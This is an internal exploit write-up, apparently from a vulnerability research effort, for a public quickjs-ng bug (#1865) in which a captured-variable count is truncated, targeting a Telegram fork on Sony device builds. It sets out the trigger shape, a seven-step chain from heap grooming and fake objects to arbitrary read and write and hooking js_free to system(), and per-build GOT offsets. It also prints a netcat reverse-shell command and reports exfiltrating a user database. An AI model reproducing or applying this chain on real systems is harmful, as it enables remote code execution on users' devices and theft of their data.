# nday-2-RCE-VARREF-1865: #1865 `var_ref_count` truncation

This is a public n-day. It was filed by this project. It is a full RCE and a
device-proven fallback, but it is **not** a deliverable because it is public.

## Identity

| Item | Value |
|---|---|
| Public issue | quickjs-ng #1865 (opened 2026-11-01 by this project) |
| Public fix | PR #1869 ("Reject functions that capture more than 65535 variables"), present in later builds |
| Fix in TG fork `fixes-backport` | **No** |
| Shipped 13.2 builds | vulnerable (v0.17.0-era and the fork snapshot) |
| Class | OOB read/write → JSVarRef leak → arbitrary R/W → `system()` |
| Deliverable | **No**: public |

## Root cause

`JSFunctionBytecode.var_ref_count` is a `uint16_t`, but the compiler counts
captured variables in an `int`. A sloppy-mode generator with 65,533 duplicate
`x` parameters plus `y` and a parse-time direct `eval` (`if (0) eval("")`)
makes every argument captured: 65,539 captures, truncated to 3 in the
bytecode.

The frame allocates only 3 `JSVarRef*` entries. At run time `get_var_ref()`
indexes `sf->var_refs[65533]`, about 524 KB past the 1 MB frame, into the next
allocation. The OOB slot is a `JSVarRef*` written by the engine.

## Trigger shape

The generator source is built at run time:

```js
"x,".repeat(65533) + "y"
```

The full function is a sloppy-mode generator with the duplicate parameters and
a direct `eval` that forces the capture analysis. The 131 KB source is
generated in the widget; it is not stored in the HTML.

## Chain

1. Two 1 MB `ArrayBuffer` grooms (`b0a`/`b0b`, later an A/T cache groom) catch
   the OOB `JSVarRef*` write.
2. The chain leaks a real `JSVarRef` and completes the generator so the frame
   is reused by a `buf2` `ArrayBuffer`.
3. A fake `BigInt` over the leaked frame leaks `V->pvalue`, the frame address
   `F`.
4. A fake indirect `JSString` at `F+0x100` gives arbitrary byte read; a fake
   `Uint8Array` at `F+0x1000` gives arbitrary byte write.
5. Engine walk: `sf+8 → cur_func → +0x30 → bytecode → +0x48 → ctx → +16 → rt`.
6. Resolve `js_def_free` → PLT → GOT → libc `system`.
7. Hook `rt->mf.js_free = system`, write the command, free the trigger.

The per-build constants are only `js_def_free` and the `free` GOT slot. The
universal layer resolves libc `system` from the ELF tables at run time.

## Device results

| Build | Result |
|---|---|
| Sony 72789 | **10/10** cold starts; fresh 186-byte proof each run; `S1 off=511928`; no crash |
| Sony 72799 | v2 **10/10**: v4 **9/10** (one BigInt-path crash, `tombstone_20`) |
| Universal layer | **11/11** on device; two-direction groom, padding prime `len=0x41`, runtime ELF `system`; lab 5/5 in 39-bit/47-bit/bottom-up models |
| Sony 72879 C2 | full C2 session, proof **5504**, `exec rc=0`, app alive |

The 72879 C2 loader is `loader-1865-sony-72879.html`: 8,094 raw / 3,486 zlib9.
The command is a loopback bootstrap:

```
setsid sh -c 'sleep 2|nc <host> 4445|sh' &
```

The loader is plain text in a `<script type="text/plain">` block and is
evaluated synchronously.

The reverse-shell variant also worked: `setsid` FIFO/netcat shell, app-UID
shell, `cache4.db` exfiltrated (4,575,232 B) after the app process crashed.

## Fix

PR #1869 rejects functions that capture more than 65,535 variables. It is
present in later builds; the 13.2 builds used here are vulnerable. If the
shipped source adopts the fix, this fallback dies.

## Why it is kept

- It is the ready fallback if the #1827 fix is backported into the shipped
  source first.
- It is device-proven 10/10, not just host-proven.
- Its universal endgame is reusable.

It is still a public n-day. It is not the answer to the 0day requirement.

## Files

| File | What |
|---|---|
| `payloads/loader-1865-sony-72879.html` | 8,094 B / 3,486 zlib9 C2 loader for 72879. |
| `evidence/72789-72879-c2-notes.md` | The original note: constants per build, proof 5504, transformation pitfall. |

## Per-build constants

| Build | `js_def_free` | `free@GOT` |
|---|---:|---:|
| 72549/72559/72569 | `0x1734fec` | `0x193dd68` |
| 72609 | `0x174b1ac` | `0x19547f0` |
| 72789 | `0x1739aec` | `0x1960430` |
| 72799 | `0x173e36c` | `0x1964cc0` |
| 72879 | `0x174926c` | `0x196fef0` |

`system` is resolved from libc `.dynsym` (GNU hash plus linear fallback); the
`free+0x26df0` delta is only a fallback.
